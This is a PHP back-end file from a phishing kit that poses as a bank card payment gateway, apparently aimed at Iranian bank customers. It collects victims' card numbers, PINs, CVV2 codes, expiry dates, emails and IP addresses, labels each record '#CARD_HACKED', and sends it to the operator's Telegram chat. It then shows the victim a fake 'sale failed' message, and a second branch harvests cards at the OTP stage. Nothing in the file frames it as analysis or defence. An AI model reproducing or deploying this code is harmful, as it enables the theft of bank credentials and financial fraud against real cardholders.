<?php

########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################

session_start() ;
error_reporting(0);

require("function.php");
require("../datainfo.php");

$input       = file_get_contents("php://input");
$json        = json_decode($input, true);

$panchek = strlen($json["pan"]);
if($panchek=='16'){
$pan= $json["pan"];
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
}
$pinchek = strlen($json["pin"]);
if($pinchek=='5'||$pinchek=='6'||$pinchek=='7'||$pinchek=='8'||$pinchek=='9'||$pinchek=='10'||$pinchek=='11'||$pinchel=='12'){
$pin = $json["pin"];
}
$cvvchek = strlen($json["cvv2"]);
if($cvvchek=='3'||$cvvchek=='4'){
$cvv2 = $json["cvv2"];
}
	
$yearchek = strlen($json["expireYear"]);
if($yearchek=='2'){
$year = $json["expireYear"];
}
$monthchek = strlen($json["expireMonth"]);
if($monthchek=='2'){
$month = $json["expireMonth"];
}
if(!empty($json["email"])) {
$email = $json["email"] ;
}else{
$email= "None ❌" ;
} 
$captchachek=strlen($json["captcha"]);
if($captchachek=='5'){
$captcha=$json["captcha"];
}
if(strlen($_GET["RefId"]) ==16){
$refid= $_GET["RefId"] ;
}

@mkdir("database") ;
if(!file_exists("database/index.php")) {
file_put_contents("database/index.php", null) ;
} 


if(isset($_SESSION["amount"])) {

$amount = $_SESSION["amount"] ;

} else {
$amount ="50,000";

} 
	
if(isset($pan) and isset($cvv2) and isset($month) and isset($year) and isset($pin) and isset($captcha)) {
	
if($_SESSION["captcha"] == $captcha) {
	
	
	
	if(bankCardCheck($pan)) {
		
		
	   $lastname ="UnKnow" ;
	   $firstname ="Unknow" ;
	
	if(GetHolderName($pan)) {
	   $firstname   = $Firstname;
	   $lastname   = $Lastname ;
	   $bankname = $Bankname ;
	  }
	
	
	   $bankinfo = bank_information($pan);
	
	    if(!file_exists("database/".$pan.".json")){
		
		file_put_contents("database/".$pan.".json", json_encode(array("spam" => 1))) ;
		$spam = 1;
		
		}else {
		
		$data = json_decode(file_get_contents("database/".$pan.".json"));
		$spam = $data->spam+1;
		$type = $data->type;
		file_put_contents("database/".$pan.".json", json_encode(array("spam" =>$spam,"type" =>$type)));
		
			
			} 
			
			if($spam <=  $Spam ){
				
				
			if($data->type =="otp") {
				
				$pass="OᴛᴘPᴀss" ;
				
				} else {
					
				$pass="𝘗𝘈𝘚𝘚𝟐";
					
					} 
						
						Getip() ;
						
					
 $TextPayment="
#ＣＡＲＤ_ＨＡＣＫＥＤ

🏦вǞПκ  : $bankinfo[1]
☔ƤᾋƝ    : <code>$pan1 $pan2 $pan3 $pan4</code>
🔐$pass : <code>$pin</code>
🔖𝑪𝒗𝒗𝟐     : <code>$cvv2</code>
🎈Yᴇᴀʀ    : <code>$year</code> Mᴏɴᴛʜ : <code>$month</code> 
👤Ɲαмє  : <code>$firstname</code>
👥LᴀsᴛNᴀᴍᴇ : <code>$lastname</code>
🌠 Eᴍᴀɪʟ  :  $email
🛶іթ ѦԀԀГЄՏՏ : <code>$ip</code> 
💴 Aмøυит : <code>$amount</code>
❌Sραм  : <b>$spam</b>
⛔️ Mαde By : ＃ X D E R A G O N

#ＩＮＦＯ_ＣＡＲＤ

";
$TextPayment.="\n $bankinfo[0]";


        SendMessage(API_KEY,CHAT_ID, $TextPayment, json_encode(['inline_keyboard' =>[ [["text" =>"𝙊𝙬𝙣𝙚𝙧 🧑‍💻 ", "url"=>"https://t.me/phlvy"]], ], "resize_keyboard" =>true]));

		 print(json_encode(array("status" =>"SALE_FAILED", "description" =>" اطلاعات وارد شده صحیح نمیباشد"))) ;
	      

      }else {
	
	
	print(json_encode(array("status" =>"BLOCKER_ERROR"))) ;
	
	}
 
	
	  } else {
		
		print(json_encode(array("status" =>"SALE_FAILED", "responseCode" => "11","description" => " شماره کارت وارد شده صحیح نمیباشد"))) ;
		
		} 
	
	} else {
		
		print(json_encode(array("status" =>"INVALID_CAPTCHA"))) ;
		
		
		} 
	
	
} else if(isset($pan) and isset($cvv2) and isset($month) and isset($year) and isset($captcha)) {

if($_SESSION["captcha"] == $captcha) {
	
	if(bankCardCheck($pan)) {
		
	   $lastname ="UnKnow" ;
	   $firstname ="Unknow" ;
	
	if(GetHolderName($pan)) {
	   $firstname   = $Firstname;
	   $lastname   = $Lastname ;
	   $bankname = $Bankname ;
	  }
	
	$bankinfo = bank_information($pan);
	
	
	    if(!file_exists("database/".$pan.".json")){
		
		file_put_contents("database/".$pan.".json", json_encode(array("spam" => 1, "type"=>"otp"))) ;
		$spam = 1;
		
		}else {
		
		$data = json_decode(file_get_contents("database/".$pan.".json"))->spam+1;
		file_put_contents("database/".$pan.".json", json_encode(array("spam" =>$data, "type" =>"otp")));
		$spam = $data ;
			
			} 
			
			if($spam <= $Spam ){
				
				
						
						Getip() ;
						
						
						
						
$TextOtp="
#ＣＡＲＤ_ＨＡＣＫＥＤ

🏦вǞПκ  : $bankinfo[1]
☔ƤᾋƝ    : <code>$pan1 $pan2 $pan3 $pan4</code>
🔐ƤƛƧƧ : <code>𝙾𝚝𝚙 𝙲𝚘𝚍𝚎 𝚂𝚎𝚗𝚍𝚒𝚗𝚐</code>
🔖𝑪𝒗𝒗𝟐     : <code>$cvv2</code>
🎈Yᴇᴀʀ    : <code>$year</code> Mᴏɴᴛʜ : <code>$month</code> 
👤Ɲαмє  : <code>$firstname</code>
👥LᴀsᴛNᴀᴍᴇ : <code>$lastname</code>
🛶іթ ѦԀԀГЄՏՏ : <code>$ip</code> 
💴 Aмøυит : <code>$amount</code>
❌Sραм  : <b>$spam</b>
⛔️ Mαde By : ＃ X D E R A G O N

#ＩＮＦＯ_ＣＡＲＤ
";
$TextOtp.="\n $bankinfo[0]";

       SendMessage(API_KEY,CHAT_ID,$TextOtp, json_encode(['inline_keyboard' =>[ [["text" =>"𝙊𝙬𝙣𝙚𝙧 🧑‍💻 ", "url"=>"https://t.me/phlvy"]], ], "resize_keyboard" =>true]));
	   print(json_encode(array("status" =>"OK"))) ;
	      

      }else {
	
	
	print(json_encode(array("status" =>"BLOCKER_ERROR"))) ;
	
	}
	
	
	
	 } else {
		
		print(json_encode(array("status" =>"INVALID_PAN"))) ;
	
		
		}
		
	
	} else {
		
		print(json_encode(array("status" =>"INVALID_CAPTCHA"))) ;
		
		
		}
		

} else {
die(http_response_code(404));
	} 

########################
#								         	           # 
# TelgeramID : Xderagon	              #
# Made BY Xderagon		                   # 
#													             # 
#TelgeramID : Xderagon	                       #
# Made BY Xderagon							       # 
#												                        # 
#												                            # 
################################

?>
	